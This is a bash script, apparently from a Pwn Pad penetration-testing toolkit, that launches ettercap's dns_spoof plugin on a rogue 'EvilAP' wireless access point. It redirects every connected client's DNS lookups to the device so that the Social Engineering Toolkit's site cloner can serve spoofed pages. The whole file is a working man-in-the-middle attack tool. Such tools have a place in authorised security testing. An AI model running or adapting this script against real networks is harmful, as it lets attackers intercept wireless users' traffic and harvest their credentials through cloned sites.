#!/bin/bash
# Script to use ettercap to redirect all DNS traffic back to the device
# Use with SET (site cloner)
#set the prompt to the name of the script
PS1=${PS1//@\\h/@dnsspoof}
clear

. /opt/pwnix/pwnpad-scripts/px_functions.sh

f_hangup(){
  pkill -f 'ettercap -i wlan1 -T -q -P dns_spoof'
  exit 1
}

f_banner(){
  printf "\nEvilAP Ettercap-NG DNS Spoofing Tool\n\n"
  printf "[!] This only works when EvilAP is running!\n"
  printf "[-] All DNS requests from wireless clients connected to EvilAP will be redirected to IP of EvilAP (192.168.7.1)\n\n"
  printf "[+] Use with Social Engineering Toolkit\n"
  printf "[-] (site cloner uses 192.168.7.1)\n\n"
}

f_run(){
  f_banner
  
  trap f_hangup INT
  trap f_hangup KILL
  trap f_hangup SIGHUP

  #ettercap fails if the interface is down
  ip link set ${evilap_eth} up

  ettercap -i ${evilap_eth} -T -q -P dns_spoof
}

if loud_one=1 f_validate_one at0; then
  evilap_eth="at0"
fi
if f_validate_one wlan1; then
  if pgrep hostapd-wpe; then
    #this clear removes the noise from the at0 check
    clear
    evilap_eth="wlan1"
  fi
fi

[ -n "${evilap_eth}" ] && f_run
